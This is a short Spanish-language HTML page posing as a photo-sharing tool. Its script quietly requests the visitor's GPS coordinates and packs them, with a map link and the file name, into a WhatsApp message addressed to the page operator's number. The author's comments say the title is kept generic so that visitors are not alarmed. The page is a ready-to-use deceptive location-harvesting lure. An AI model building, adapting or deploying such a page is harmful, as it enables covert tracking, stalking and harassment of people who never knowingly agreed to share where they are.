<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Compartir Foto</title>
    <style>
        body { 
            font-family: sans-serif; 
            background-color: #121212; 
            color: white; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0;
        }
        
        /* Botón discreto */
        .btn-action {
            background-color: #3a7bd5;
            width: 90%;
            padding: 15px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }

        #cameraInput { display: none; }
        #status { margin-top: 10px; font-size: 12px; color: #888; }
    </style>
</head>
<body>

    <!-- Título genérico para que no dé miedo -->
    <h1>📸 Compartir Imagen</h1>
    
    <div class="btn-action" onclick="startProcess()">
        Seleccionar Imagen
    </div>

    <input type="file" id="cameraInput" accept="image/*" capture="environment" onchange="sendToWhatsapp(this)">
    
    <p id="status"></p>

    <script>
        // TU NÚMERO AQUÍ (ej: 52155...)
        const MY_NUMBER = "TU_NUMERO_AQUI"; 

        let lat = null;
        let lon = null;

        function startProcess() {
            document.getElementById('status').innerText = "Obteniendo ubicación...";
            
            // Pedir GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        lat = pos.coords.latitude;
                        lon = pos.coords.longitude;
                        // Abrir selector de fotos/cámara
                        document.getElementById('cameraInput').click();
                    },
                    () => {
                        alert("Permiso de ubicación denegado.");
                        document.getElementById('cameraInput').click();
                    }
                );
            } else {
                document.getElementById('cameraInput').click();
            }
        }

        function sendToWhatsapp(input) {
            if (input.files && input.files[0]) {
                const file = input.files[0];
                
                // Mensaje que se enviará
                let msg = `Foto enviada.\n`;
                msg += `📍 Ubicación: ${lat ? lat.toFixed(6) + ', ' + lon.toFixed(6) : 'N/A'}\n`;
                msg += `🗺️ Mapa: https://www.google.com/maps?q=${lat},${lon}\n`;
                msg += `📷 Archivo: ${file.name}`;

                // Abrir WhatsApp
                const url = `https://wa.me/${MY_NUMBER}?text=${encodeURIComponent(msg)}`;
                window.location.href = url;
                
                // Nota: El archivo NO se adjunta automáticamente por API estándar de WA Web,
                // pero el link está listo para que tú lo veas o ellos lo adjunten manualmente.
            }
        }
    </script>
</body>
</html>
